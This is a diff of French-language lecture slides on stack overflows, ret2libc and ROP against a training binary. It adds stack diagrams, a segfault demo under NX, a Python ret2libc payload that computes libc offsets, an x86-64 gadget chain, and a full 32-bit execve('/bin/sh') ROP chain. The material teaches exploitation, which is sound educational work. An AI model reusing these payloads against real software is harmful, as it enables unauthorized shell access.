@@ -156,13 +156,35 @@ Pointeur d'instruction sur 0x41414141
 </section>
 <section data-markdown>
 <script type="text/template">
-## Dessin stack avant call et dans sous-programme
+### Pile avant/après `call`
+
+![avant call](res/stack-before-call.jpg)
+![apres call](res/stack-after-call.jpg)
 
 </script>
 </section>
 <section data-markdown>
 <script type="text/template">
-## Dessins stack avant return, après return
+### Pile avant/après `ret`
+
+![avant ret](res/stack-before-ret.jpg)
+![apres ret](res/stack-after-ret.jpg)
+
+</script>
+</section>
+<section data-markdown>
+<script type="text/template">
+### debug_func
+
+![source](res/debug_func.jpg)
+
+</script>
+</section>
+<section data-markdown>
+<script type="text/template">
+### debug_func
+
+![source](res/debug_func-anot.jpg)
 
 </script>
 </section>
@@ -189,14 +211,22 @@ Pointeur d'instruction sur 0x41414141
 </section>
 <section data-markdown>
 <script type="text/template">
-## Asciinema exploit
+### Exploit
+<script type="text/javascript" src="https://asciinema.org/a/c2igxid384yi2kicrre6ix97p.js" id="asciicast-c2igxid384yi2kicrre6ix97p" async data-size="big" data-theme="solarized-light" class="stretch"></script>
 
 </script>
 </section>
 <section data-markdown>
 <script type="text/template">
-## Ce qui s'est passé
-Dessin de stack avec retour dans notre buffer.
+### Ce qui s'est passé
+![stack-avant](res/stack-before-read.jpg)
+
+</script>
+</section>
+<section data-markdown>
+<script type="text/template">
+### Ce qui s'est passé
+![stack-avant](res/stack-after-read.jpg)
 
 </script>
 </section>
@@ -222,7 +252,16 @@ locales.
 <script type="text/template">
 ## Conséquences sur notre exploit
 
-Demo avec NX (segfault)
+```
+ppp@forsaker:~/work/latece-rop $ python exploit.py | ./bin/tvstation
+=== TV Station - Control Panel ===
+1) Show uptime
+2) Show current user
+3) Exit
+Choice: === TV Station - Debug Menu ===
+[Debug menu] system is @0x80488b0
+[Debug menu] enter cmd: Segmentation fault
+```
 
 </script>
 </section>
@@ -302,8 +341,25 @@ Dessin de stack de ce qu'on veut comme setup
 ## Ret2libc - Exploit - payload
 
 ``` python
-# Code de l'exploit
-``` 
+# Parser l'adresse de system
+libc_system = int(data.split("@")[1].split("\n")[0], 16)
+
+# Trouver la base de libc
+libc_system_offset = 0x3ab30
+libc_base = libc_system - libc_system_offset
+
+# Trouver l'adresse de "/bin/sh" a partir de la base de libc
+binsh_offset = 0x15c739
+binsh = libc_base + binsh_offset
+
+payload = "A" * 32 # Padding jusqu'a l'adresse de retour
+payload += p32(libc_system) # Ecraser adresse de retour par adresse de system
+payload += p32(binsh) # Argument 1 (pointeur vers "/bin/sh")
+
+# Press ze button!
+p.sendline(payload)
+```
+<!-- .element: class="stretch" -->
 
 </script>
 </section>
@@ -387,7 +443,11 @@ Plus qu'à avoir le pointeur de pile qui pointe sur notre pointeur vers `"/bin/s
 ## Résultat
 
 ``` python
-copy pasta du code
+payload = ""
+payload += "A" * 40
+payload += p64(pop_rdi_ret)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
 ```
 
 </script>
@@ -404,7 +464,67 @@ GDB script pour voir les returns successifs
 <script type="text/template">
 ## Une ROP-chain plus réaliste
 
-Exemple d'une ROP-chain de execve ou read/write/reboot.
+``` python
+p = ''
+p += pk(0x0806f4ea) # pop edx ; ret
+p += pk(0x080eb060) # @ .data
+p += pk(0x080bb926) # pop eax ; ret
+p += '/bin'
+p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
+p += pk(0x41414141) # padding
+p += pk(0x0806f4ea) # pop edx ; ret
+p += pk(0x080eb064) # @ .data + 4
+p += pk(0x080bb926) # pop eax ; ret
+p += '//sh'
+p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
+p += pk(0x41414141) # padding
+p += pk(0x0806f4ea) # pop edx ; ret
+p += pk(0x080eb068) # @ .data + 8
+p += pk(0x08054f10) # xor eax, eax ; ret
+p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
+p += pk(0x41414141) # padding
+p += pk(0x080481c9) # pop ebx ; ret
+p += pk(0x080eb060) # @ .data
+p += pk(0x0806f511) # pop ecx ; pop ebx ; ret
+p += pk(0x080eb068) # @ .data + 8
+p += pk(0x080eb060) # padding without overwrite ebx
+p += pk(0x0806f4ea) # pop edx ; ret
+p += pk(0x080eb068) # @ .data + 8
+p += pk(0x08054f10) # xor eax, eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x0807bf4f) # inc eax ; ret
+p += pk(0x080499c1) # int 0x80
+```
+
+<!-- .elements class="stretch" -->
+
+</script>
+</section>
+</section>
+
+<section>
+<section data-markdown>
+<script type="text/template">
+## Conclusion
+
+Mitigations: ROPGuard, Emet, kBouncer, /ROP, etc.
+
+</script>
+</section>
+<section data-markdown>
+<script type="text/template">
+## Bonus
+
+Devinnez ce que fait cette ROP-chain...
 
 </script>
 </section>
